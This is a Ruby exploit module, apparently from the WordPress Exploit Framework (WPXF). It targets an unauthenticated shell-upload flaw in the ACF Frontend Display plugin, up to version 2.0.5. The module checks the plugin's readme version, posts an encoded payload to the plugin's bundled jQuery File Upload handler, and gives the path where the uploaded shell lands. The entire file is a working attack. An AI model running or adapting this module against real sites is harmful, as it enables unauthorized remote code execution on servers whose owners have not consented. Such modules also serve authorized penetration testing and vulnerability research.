# frozen_string_literal: true

class Wpxf::Exploit::AcfFrontendDisplayShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'ACF Frontend Display <= 2.0.5 Unauthenticated Shell Upload',
      author: [
        'TCYB3R',    # Discovery and disclosure
        'rastating'  # WPXF module
      ],
      references: [
        ['WPVDB', '8086'],
        ['EDB', '37514']
      ],
      date: 'Jul 03 2015'
    )
  end

  def check
    check_plugin_version_from_readme('acf-frontend-display', '2.0.6')
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, 'acf-frontend-display', 'js', 'blueimp-jQuery-File-Upload-d45deb1', 'server', 'php', 'index.php')
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_field('action', 'upload')
    builder.add_file_from_string('files', payload.encoded, payload_name)
    builder
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_uploads, "uigen_#{Time.now.strftime('%Y')}", payload_name)
  end
end
